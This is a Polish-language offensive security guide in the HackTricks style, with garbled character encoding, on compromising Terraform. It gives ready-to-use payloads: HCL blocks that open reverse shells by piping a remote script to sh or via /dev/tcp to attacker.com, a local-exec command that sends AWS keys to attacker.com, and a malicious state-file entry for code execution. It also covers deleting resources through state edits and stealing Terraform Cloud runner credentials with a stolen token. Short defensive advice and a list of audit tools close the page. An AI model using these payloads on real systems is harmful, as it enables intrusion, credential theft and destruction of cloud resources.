# Terraform BezpieczeÅ„stwo

{{#include ../banners/hacktricks-training.md}}

## Podstawowe informacje

[Z dokumentacji:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform to **narzÄ™dzie infrastructure as code**, ktÃ³re pozwala zdefiniowaÄ‡ zarÃ³wno **zasoby w chmurze, jak i onâ€‘prem** w czytelnych dla czÅ‚owieka plikach konfiguracyjnych, ktÃ³re moÅ¼esz wersjonowaÄ‡, ponownie wykorzystywaÄ‡ i udostÄ™pniaÄ‡. NastÄ™pnie moÅ¼esz uÅ¼yÄ‡ spÃ³jnego workflow do wdraÅ¼ania i zarzÄ…dzania caÅ‚Ä… infrastrukturÄ… przez caÅ‚y jej cykl Å¼ycia. Terraform moÅ¼e zarzÄ…dzaÄ‡ niskopoziomowymi komponentami, takimi jak zasoby obliczeniowe, pamiÄ™ci i sieciowe, jak rÃ³wnieÅ¼ wysokopoziomowymi komponentami, takimi jak wpisy DNS i funkcje SaaS.

#### Jak dziaÅ‚a Terraform?

Terraform tworzy i zarzÄ…dza zasobami na platformach chmurowych oraz innych usÅ‚ugach poprzez ich interfejsy programistyczne (APIs). Providery umoÅ¼liwiajÄ… Terraformowi pracÄ™ praktycznie z dowolnÄ… platformÄ… lub usÅ‚ugÄ… posiadajÄ…cÄ… dostÄ™pne API.

![](<../images/image (177).png>)

HashiCorp i spoÅ‚ecznoÅ›Ä‡ Terraformu napisaÅ‚y juÅ¼ **ponad 1700 providerÃ³w** do zarzÄ…dzania tysiÄ…cami rÃ³Å¼nych typÃ³w zasobÃ³w i usÅ‚ug, a ta liczba wciÄ…Å¼ roÅ›nie. Wszystkie publicznie dostÄ™pne providery znajdziesz w [Terraform Registry](https://registry.terraform.io/), w tym Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog i wiele innych.

Podstawowy workflow Terraform skÅ‚ada siÄ™ z trzech etapÃ³w:

- **Write:** Definiujesz zasoby, ktÃ³re mogÄ… obejmowaÄ‡ wiele dostawcÃ³w chmurowych i usÅ‚ug. Na przykÅ‚ad moÅ¼esz utworzyÄ‡ konfiguracjÄ™ do wdroÅ¼enia aplikacji na maszynach wirtualnych w Virtual Private Cloud (VPC) z security groups i load balancerem.
- **Plan:** Terraform tworzy execution plan opisujÄ…cy infrastrukturÄ™, ktÃ³rÄ… utworzy, zaktualizuje lub usunie na podstawie istniejÄ…cej infrastruktury i Twojej konfiguracji.
- **Apply:** Po zatwierdzeniu Terraform wykonuje proponowane operacje w odpowiedniej kolejnoÅ›ci, respektujÄ…c zaleÅ¼noÅ›ci miÄ™dzy zasobami. Na przykÅ‚ad, jeÅ›li zaktualizujesz wÅ‚aÅ›ciwoÅ›ci VPC i zmienisz liczbÄ™ maszyn wirtualnych w tym VPC, Terraform odtworzy VPC przed skalowaniem maszyn wirtualnych.

![](<../images/image (215).png>)

### Laboratorium Terraform

Po prostu zainstaluj terraform na swoim komputerze.

Tutaj masz [przewodnik](https://learn.hashicorp.com/tutorials/terraform/install-cli) i tutaj masz [najlepszy sposÃ³b na pobranie terraform](https://www.terraform.io/downloads).

## RCE in Terraform: config file poisoning

Terraform **nie udostÄ™pnia platformy z stronÄ… WWW ani usÅ‚ugÄ… sieciowÄ…**, ktÃ³rÄ… moÅ¼na by enumerowaÄ‡, dlatego jedynym sposobem na przejÄ™cie terraform jest moÅ¼liwoÅ›Ä‡ **dodawania/modyfikowania plikÃ³w konfiguracyjnych terraform** lub moÅ¼liwoÅ›Ä‡ **modyfikacji pliku stanu terraform** (zobacz rozdziaÅ‚ poniÅ¼ej).

Jednak terraform to **bardzo wraÅ¼liwy komponent** do skompromitowania, poniewaÅ¼ bÄ™dzie miaÅ‚ **uprzywilejowany dostÄ™p** do rÃ³Å¼nych lokalizacji, aby mÃ³gÅ‚ prawidÅ‚owo dziaÅ‚aÄ‡.

GÅ‚Ã³wnym sposobem dla atakujÄ…cego na przejÄ™cie systemu, na ktÃ³rym dziaÅ‚a terraform, jest **skompromitowanie repozytorium przechowujÄ…cego konfiguracje terraform**, poniewaÅ¼ w pewnym momencie zostanÄ… one **zinterpretowane**.

W rzeczywistoÅ›ci istniejÄ… rozwiÄ…zania, ktÃ³re **wykonujÄ… terraform plan/apply automatycznie po utworzeniu PR**, takie jak **Atlantis**:

{{#ref}}
atlantis-security.md
{{#endref}}

JeÅ›li uda Ci siÄ™ skompromitowaÄ‡ plik terraform, istniejÄ… rÃ³Å¼ne sposoby na wykonanie RCE, gdy ktoÅ› uruchomi `terraform plan` lub `terraform apply`.

### Terraform plan

Terraform plan to **najczÄ™Å›ciej uÅ¼ywane polecenie** w terraform i deweloperzy/rozwiÄ…zania korzystajÄ…ce z terraform uruchamiajÄ… je caÅ‚y czas, wiÄ™c **najprostszy sposÃ³b na uzyskanie RCE** to upewniÄ‡ siÄ™, Å¼e zatrujesz plik konfiguracyjny terraform, ktÃ³ry wykona dowolne polecenia podczas `terraform plan`.

**UÅ¼ycie providera external**

Terraform oferuje [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs), ktÃ³ry zapewnia sposÃ³b interakcji miÄ™dzy Terraformem a zewnÄ™trznymi programami. MoÅ¼esz uÅ¼yÄ‡ ÅºrÃ³dÅ‚a danych `external`, aby uruchomiÄ‡ dowolny kod podczas `plan`.

WstrzykniÄ™cie do pliku konfiguracyjnego terraform czegoÅ› takiego spowoduje wykonanie rev shell podczas uruchamiania `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**UÅ¼ycie niestandardowego providera**

AtakujÄ…cy mÃ³gÅ‚by przesÅ‚aÄ‡ [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup) do [Terraform Registry](https://registry.terraform.io/) i nastÄ™pnie dodaÄ‡ go do kodu Terraform w feature branchu ([example from here](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Provider jest pobierany podczas `init` i uruchomi zÅ‚oÅ›liwy kod, gdy zostanie wykonany `plan`

PrzykÅ‚ad znajdziesz w [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**UÅ¼ycie zewnÄ™trznego odwoÅ‚ania**

Obie wymienione opcje sÄ… przydatne, ale niezbyt dyskretne (druga jest bardziej dyskretna, lecz bardziej skomplikowana niÅ¼ pierwsza). MoÅ¼esz przeprowadziÄ‡ ten atak w jeszcze bardziej **dyskretny sposÃ³b**, stosujÄ…c siÄ™ do poniÅ¼szych sugestii:

- Zamiast dodawaÄ‡ rev shell bezpoÅ›rednio do pliku terraform, moÅ¼esz **zaÅ‚adowaÄ‡ zewnÄ™trzny zasÃ³b**, ktÃ³ry zawiera rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
You can find the rev shell code in [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

- W zewnÄ™trznym zasobie uÅ¼yj funkcji **ref** aby ukryÄ‡ **terraform rev shell code in a branch** w repozytorium, na przykÅ‚ad: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply zostanie wykonany, aby zastosowaÄ‡ wszystkie zmiany; moÅ¼esz teÅ¼ naduÅ¼yÄ‡ go, aby uzyskaÄ‡ RCE, wstrzykujÄ…c **zÅ‚oÅ›liwy plik Terraform z** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Musisz tylko upewniÄ‡ siÄ™, Å¼e jakiÅ› payload podobny do poniÅ¼szych znajduje siÄ™ w pliku `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
PostÄ™puj zgodnie z **sugestiami z poprzedniej techniki**, aby przeprowadziÄ‡ ten atak w **bardziej dyskretny sposÃ³b, uÅ¼ywajÄ…c zewnÄ™trznych odwoÅ‚aÅ„**.

## Secrets Dumps

MoÅ¼esz spowodowaÄ‡, Å¼e **secret values used by terraform dumped** uruchamiajÄ…c `terraform apply` przez dodanie do pliku terraform czegoÅ› takiego:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Wykorzystywanie plikÃ³w stanu Terraform

W przypadku gdy masz prawa zapisu do plikÃ³w stanu terraform, ale nie moÅ¼esz zmieniaÄ‡ kodu terraform, [**this research**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) przedstawia kilka interesujÄ…cych opcji wykorzystania takiego pliku. Nawet jeÅ›li miaÅ‚byÅ› prawa zapisu do plikÃ³w konfiguracyjnych, uÅ¼ycie wektora plikÃ³w stanu jest czÄ™sto znacznie bardziej podstÄ™pne, poniewaÅ¼ nie zostawiasz Å›ladÃ³w w historii `git`.

### RCE in Terraform: config file poisoning

MoÅ¼liwe jest [create a custom provider](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) i po prostu zastÄ…piÄ‡ jednego z providerÃ³w w pliku stanu terraform zÅ‚oÅ›liwym albo dodaÄ‡ faÅ‚szywy resource odwoÅ‚ujÄ…cy siÄ™ do zÅ‚oÅ›liwego providera.

Provider [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) opiera siÄ™ na tym badaniu i uzbraja tÄ™ zasadÄ™. MoÅ¼esz dodaÄ‡ faÅ‚szywy resource i umieÅ›ciÄ‡ dowolne polecenie bash, ktÃ³re chcesz wykonaÄ‡, w atrybucie `command`. Gdy uruchomione zostanie `terraform`, polecenie to zostanie odczytane i wykonane zarÃ³wno w krokach `terraform plan`, jak i `terraform apply`. W przypadku kroku `terraform apply`, `terraform` usunie faÅ‚szywy resource z pliku stanu po wykonaniu twojego polecenia, sprzÄ…tajÄ…c po sobie. WiÄ™cej informacji i peÅ‚ne demo moÅ¼na znaleÅºÄ‡ w [GitHub repository hosting the source code for this provider](https://github.com/offensive-actions/terraform-provider-statefile-rce).

Aby uÅ¼yÄ‡ tego bezpoÅ›rednio, po prostu doÅ‚Ä…cz poniÅ¼szy fragment w dowolnym miejscu tablicy `resources` i dostosuj atrybuty `name` oraz `command`:
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
Then, as soon as `terraform` gets executed, your code will run.

### Usuwanie zasobÃ³w <a href="#deleting-resources" id="deleting-resources"></a>

IstniejÄ… 2 sposoby na usuniÄ™cie zasobÃ³w:

1. **Wstaw do pliku stanu zasÃ³b o losowej nazwie wskazujÄ…cy na rzeczywisty zasÃ³b do usuniÄ™cia**

PoniewaÅ¼ `terraform` zobaczy, Å¼e zasÃ³b nie powinien istnieÄ‡, zniszczy go (uÅ¼ywajÄ…c wskazanego rzeczywistego ID zasobu). PrzykÅ‚ad z poprzedniej strony:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **ZmieÅ„ zasÃ³b tak, aby zostaÅ‚ usuniÄ™ty w sposÃ³b uniemoÅ¼liwiajÄ…cy jego aktualizacjÄ™ (czyli zostanie usuniÄ™ty i odtworzony)**

Dla instancji EC2 zmiana typu instancji wystarczy, aby terraform usunÄ…Å‚ i odtworzyÅ‚ jÄ….

### ZastÄ…p zablokowany provider

JeÅ›li napotkasz sytuacjÄ™, w ktÃ³rej `hashicorp/external` zostaÅ‚ zablokowany, moÅ¼esz ponownie zaimplementowaÄ‡ provider `external`, wykonujÄ…c poniÅ¼sze kroki. Uwaga: uÅ¼ywamy forka providera external opublikowanego pod adresem https://registry.terraform.io/providers/nazarewk/external/latest. MoÅ¼esz teÅ¼ opublikowaÄ‡ wÅ‚asny fork lub ponownÄ… implementacjÄ™.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
NastÄ™pnie moÅ¼esz uÅ¼yÄ‡ `external` jak zwykle.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Terraform Cloud speculative plan RCE and credential exfiltration

Ten scenariusz naduÅ¼ywa Terraform Cloud (TFC) runners podczas speculative plans, aby pivot into the target cloud account.

- Warunki wstÄ™pne:
- Ukradnij token Terraform Cloud z maszyny dewelopera. CLI przechowuje tokeny w postaci zwykÅ‚ego tekstu w `~/.terraform.d/credentials.tfrc.json`.
- Token musi mieÄ‡ dostÄ™p do docelowej organization/workspace i co najmniej uprawnienie `plan`. VCS-backed workspaces blokujÄ… `apply` z CLI, ale nadal pozwalajÄ… na speculative plans.

- Odkryj workspace i ustawienia VCS za pomocÄ… TFC API:
```bash
export TF_TOKEN=<stolen_token>
curl -s -H "Authorization: Bearer $TF_TOKEN" \
https://app.terraform.io/api/v2/organizations/<org>/workspaces/<workspace> | jq
```
- WywoÅ‚aj wykonanie kodu podczas speculative plan, uÅ¼ywajÄ…c external data source oraz Terraform Cloud "cloud" block, aby zaatakowaÄ‡ VCS-backed workspace:
```hcl
terraform {
cloud {
organization = "acmecorp"
workspaces { name = "gcp-infra-prod" }
}
}

data "external" "exec" {
program = ["bash", "./rsync.sh"]
}
```
PrzykÅ‚adowy rsync.sh, aby uzyskaÄ‡ reverse shell na TFC runner:
```bash
#!/usr/bin/env bash
bash -c 'exec bash -i >& /dev/tcp/attacker.com/19863 0>&1'
```
Uruchom spekulatywny plan, aby wykonaÄ‡ program na ephemeral runner:
```bash
terraform init
terraform plan
```
- Wypisz i wyeksfiltruj wstrzykniÄ™te poÅ›wiadczenia chmurowe z runnera. Podczas uruchomieÅ„ TFC wstrzykuje poÅ›wiadczenia providerÃ³w poprzez pliki i zmienne Å›rodowiskowe:
```bash
env | grep -i gcp || true
env | grep -i aws || true
```
Oczekiwane pliki w katalogu roboczym runnera:
- GCP:
- `tfc-google-application-credentials` (Workload Identity Federation JSON config)
- `tfc-gcp-token` (krÃ³tkotrwaÅ‚y GCP access token)
- AWS:
- `tfc-aws-shared-config` (web identity/OIDC role assumption config)
- `tfc-aws-token` (krÃ³tkotrwaÅ‚y token; niektÃ³re organizacje mogÄ… uÅ¼ywaÄ‡ statycznych kluczy)

- UÅ¼yj krÃ³tkotrwaÅ‚ych poÅ›wiadczeÅ„ poza kanaÅ‚em, aby obejÅ›Ä‡ zabezpieczenia VCS:

GCP (gcloud):
```bash
export GOOGLE_APPLICATION_CREDENTIALS=./tfc-google-application-credentials
gcloud auth login --cred-file="$GOOGLE_APPLICATION_CREDENTIALS"
gcloud config set project <PROJECT_ID>
```
AWS (AWS CLI):
```bash
export AWS_CONFIG_FILE=./tfc-aws-shared-config
export AWS_PROFILE=default
aws sts get-caller-identity
```
DziÄ™ki tym poÅ›wiadczeniom atakujÄ…cy mogÄ… tworzyÄ‡/modyfikowaÄ‡/usuwaÄ‡ zasoby bezpoÅ›rednio za pomocÄ… natywnych CLI, omijajÄ…c przepÅ‚ywy pracy oparte na PR, ktÃ³re blokujÄ… `apply` przez VCS.

- Defensive guidance:
- Stosuj zasadÄ™ najmniejszych uprawnieÅ„ wobec uÅ¼ytkownikÃ³w/zespoÅ‚Ã³w i tokenÃ³w TFC. Audytuj czÅ‚onkostwa i unikaj nadmiernie szerokich uprawnieÅ„ wÅ‚aÅ›cicieli.
- Ogranicz uprawnienie `plan` w wraÅ¼liwych workspaces opartych na VCS tam, gdzie to moÅ¼liwe.
- WymuÅ› listy dozwolonych providerÃ³w/ÅºrÃ³deÅ‚ danych za pomocÄ… polityk Sentinel, aby zablokowaÄ‡ `data "external"` lub nieznanych providerÃ³w. Zobacz wytyczne HashiCorp dotyczÄ…ce filtrowania providerÃ³w.
- Preferuj OIDC/WIF zamiast statycznych poÅ›wiadczeÅ„ chmurowych; traktuj runners jako zasoby wraÅ¼liwe. Monitoruj spekulacyjne uruchomienia planÃ³w i nieoczekiwany egress.
- Wykrywaj eksfiltracjÄ™ artefaktÃ³w poÅ›wiadczeÅ„ `tfc-*` i generuj alerty przy podejrzanym uÅ¼yciu programu `external` podczas planÃ³w.


## Kompromitacja Terraform Cloud

### UÅ¼ycie tokena

As **[explained in this post](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)**, terraform CLI stores tokens in plaintext at **`~/.terraform.d/credentials.tfrc.json`**. Ukradzenie tego tokena pozwala atakujÄ…cemu podszyÄ‡ siÄ™ pod uÅ¼ytkownika w zakresie uprawnieÅ„ tokena.

UÅ¼ywajÄ…c tego tokena, moÅ¼na uzyskaÄ‡ org/workspace za pomocÄ…:
```bash
GET https://app.terraform.io/api/v2/organizations/acmecorp/workspaces/gcp-infra-prod
Authorization: Bearer <TF_TOKEN>
```
WÃ³wczas moÅ¼liwe jest uruchomienie dowolnego kodu za pomocÄ… **`terraform plan`**, jak wyjaÅ›niono w poprzednim rozdziale.

### Ucieczka do chmury

JeÅ¼eli runner znajduje siÄ™ w Å›rodowisku chmurowym, moÅ¼na uzyskaÄ‡ token podmiotu przypisanego do runnera i wykorzystaÄ‡ go poza tym Å›rodowiskiem.

- **Pliki GCP (obecne w katalogu roboczym bieÅ¼Ä…cego uruchomienia)**
- `tfc-google-application-credentials` â€” konfiguracja JSON dla Workload Identity Federation (WIF), ktÃ³ra mÃ³wi Google, jak wymieniÄ‡ zewnÄ™trznÄ… toÅ¼samoÅ›Ä‡.
- `tfc-gcp-token` â€” krÃ³tkotrwaÅ‚y (â‰ˆ1 godz.) token dostÄ™pu GCP, na ktÃ³ry odwoÅ‚uje siÄ™ powyÅ¼szy.

- **Pliki AWS**
- `tfc-aws-shared-config` â€” JSON dla web identity federation/OIDC role assumption (preferowane zamiast statycznych kluczy).
- `tfc-aws-token` â€” krÃ³tkotrwaÅ‚y token, lub potencjalnie statyczne klucze IAM jeÅ›li Åºle skonfigurowane.


## NarzÄ™dzia automatycznego audytu

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk oferuje kompleksowe rozwiÄ…zanie do skanowania Infrastructure as Code (IaC), ktÃ³re wykrywa podatnoÅ›ci i bÅ‚Ä™dy konfiguracji w Terraform, CloudFormation, Kubernetes i innych formatach IaC.

- **Funkcje:**
- Skanowanie w czasie rzeczywistym w celu wykrywania podatnoÅ›ci i problemÃ³w ze zgodnoÅ›ciÄ….
- Integracja z systemami kontroli wersji (GitHub, GitLab, Bitbucket).
- Automatyczne pull requesty z poprawkami.
- SzczegÃ³Å‚owe porady dotyczÄ…ce naprawy.
- **Sign Up:** UtwÃ³rz konto na [Snyk](https://snyk.io/).
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** to narzÄ™dzie do statycznej analizy kodu dla infrastruktury jako kodu (IaC) oraz narzÄ™dzie do analizy skÅ‚adu oprogramowania (SCA) dla obrazÃ³w i pakietÃ³w open source.

Skanuje infrastrukturÄ™ chmurowÄ… provisioned using [Terraform](https://terraform.io/), [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md), or [OpenTofu](https://opentofu.org/) i wykrywa problemy z bezpieczeÅ„stwem oraz niezgodnoÅ›ci z wymaganiami compliance za pomocÄ… skanowania opartego na grafie.

Wykonuje [Software Composition Analysis (SCA) scanning](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md), ktÃ³re jest skanem pakietÃ³w open source i obrazÃ³w w poszukiwaniu Common Vulnerabilities and Exposures (CVEs).
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

Z [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance` to lekki framework testowy skoncentrowany na bezpieczeÅ„stwie i zgodnoÅ›ci dla terraform, umoÅ¼liwiajÄ…cy przeprowadzanie testÃ³w negatywnych dla twojej infrastruktury jako kodu.

- **compliance:** Zapewnia, Å¼e zaimplementowany kod przestrzega standardÃ³w bezpieczeÅ„stwa oraz twoich wÅ‚asnych, niestandardowych standardÃ³w
- **behaviour driven development:** Mamy BDD prawie do wszystkiego, dlaczego nie dla IaC?
- **portable:** wystarczy zainstalowaÄ‡ z `pip` lub uruchomiÄ‡ przez `docker`. Zobacz [Installation](https://terraform-compliance.com/pages/installation/)
- **pre-deploy:** waliduje twÃ³j kod przed jego wdroÅ¼eniem
- **easy to integrate:** moÅ¼e uruchamiaÄ‡ siÄ™ w twoim pipeline (lub w git hooks), aby upewniÄ‡ siÄ™, Å¼e wszystkie wdroÅ¼enia sÄ… walidowane.
- **segregation of duty:** moÅ¼esz przechowywaÄ‡ swoje testy w innym repozytorium, za ktÃ³re odpowiada odrÄ™bny zespÃ³Å‚.

> [!NOTE]
> Niestety, jeÅ›li kod uÅ¼ywa providerÃ³w, do ktÃ³rych nie masz dostÄ™pu, nie bÄ™dziesz w stanie wykonaÄ‡ `terraform plan` i uruchomiÄ‡ tego narzÄ™dzia.
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

From the [**docs**](https://github.com/aquasecurity/tfsec): tfsec uses static analysis of your terraform code to spot potential misconfigurations.

- â˜ï¸ Sprawdza bÅ‚Ä™dy konfiguracji u wszystkich gÅ‚Ã³wnych (i niektÃ³rych mniejszych) dostawcÃ³w chmury
- â›” Setki wbudowanych reguÅ‚
- ğŸª† Skanuje moduÅ‚y (lokalne i zdalne)
- â• Oceni wyraÅ¼enia HCL oraz wartoÅ›ci literalne
- â†ªï¸ Oceni funkcje Terraform, np. `concat()`
- ğŸ”— Oceni zaleÅ¼noÅ›ci miÄ™dzy zasobami Terraform
- ğŸ§° Kompatybilny z Terraform CDK
- ğŸ™… Stosuje (i rozszerza) zdefiniowane przez uÅ¼ytkownika polityki Rego
- ğŸ“ƒ ObsÅ‚uguje wiele formatÃ³w wyjÅ›ciowych: lovely (domyÅ›lny), JSON, SARIF, CSV, CheckStyle, JUnit, text, Gif.
- ğŸ› ï¸ Konfigurowalny (poprzez flagi CLI i/lub plik konfiguracyjny)
- âš¡ Bardzo szybki â€” potrafi skanowaÄ‡ ogromne repozytoria w krÃ³tkim czasie
```bash
brew install tfsec
tfsec /path/to/folder
```
### [terrascan](https://github.com/tenable/terrascan)

Terrascan to statyczny analizator kodu dla Infrastructure as Code. Terrascan umoÅ¼liwia:

- Bezproblemowe skanowanie Infrastructure as Code pod kÄ…tem nieprawidÅ‚owych konfiguracji.
- Monitorowanie udostÄ™pnionej infrastruktury w chmurze pod kÄ…tem zmian konfiguracji wprowadzajÄ…cych odchylenia stanu zabezpieczeÅ„ (posture drift) oraz umoÅ¼liwienie przywrÃ³cenia bezpiecznego stanu.
- Wykrywanie podatnoÅ›ci i naruszeÅ„ zgodnoÅ›ci.
- RedukcjÄ™ ryzyka przed wdroÅ¼eniem natywnej infrastruktury w chmurze.
- Oferuje elastycznoÅ›Ä‡ uruchamiania lokalnie lub integracji z CI\CD.
```bash
brew install terrascan
terrascan scan -d /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

ZnajdÅº luki w zabezpieczeniach, problemy ze zgodnoÅ›ciÄ… i nieprawidÅ‚owe konfiguracje infrastruktury na wczesnym etapie cyklu rozwoju infrastruktury jako kodu za pomocÄ… **KICS** od Checkmarx.

**KICS** oznacza **K**eeping **I**nfrastructure as **C**ode **S**ecure, jest open source i jest niezbÄ™dny dla kaÅ¼dego projektu cloud native.
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

Z [**docs**](https://github.com/tenable/terrascan): Terrascan to statyczny analizator kodu dla Infrastructure as Code. Terrascan pozwala na:

- Bezproblemowe skanowanie Infrastructure as Code w poszukiwaniu nieprawidÅ‚owych konfiguracji.
- Monitorowanie provisioned cloud infrastructure pod kÄ…tem zmian konfiguracji powodujÄ…cych posture drift oraz moÅ¼liwoÅ›Ä‡ przywrÃ³cenia bezpiecznego stanu.
- Wykrywanie podatnoÅ›ci bezpieczeÅ„stwa i naruszeÅ„ zgodnoÅ›ci.
- Åagodzenie ryzyka przed provisioning cloud native infrastructure.
- Zapewnia elastycznoÅ›Ä‡ uruchamiania lokalnie lub integracji z CI\CD.
```bash
brew install terrascan
```
## Å¹rÃ³dÅ‚a

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)
- [Terraform Cloud â€“ naduÅ¼ycie tokena zamieniajÄ…ce speculative plan w remote code execution](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)
- [Uprawnienia Terraform Cloud](https://developer.hashicorp.com/terraform/cloud-docs/users-teams-organizations/permissions)
- [Terraform Cloud API â€“ Show workspace](https://developer.hashicorp.com/terraform/cloud-docs/api-docs/workspaces#show-workspace)
- [Konfiguracja providera AWS](https://registry.terraform.io/providers/hashicorp/aws/latest/docs#provider-configuration)
- [AWS CLI â€“ OIDC role assumption](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html#cli-configure-role-oidc)
- [GCP provider â€“ Korzystanie z Terraform Cloud](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference.html#using-terraform-cloud)
- [Terraform â€“ Zmienne wraÅ¼liwe](https://developer.hashicorp.com/terraform/tutorials/configuration-language/sensitive-variables)
- [Snyk Labs â€“ Gitflops: zagroÅ¼enia platform automatyzacji Terraform](https://labs.snyk.io/resources/gitflops-dangers-of-terraform-automation-platforms/)

{{#include ../banners/hacktricks-training.md}}
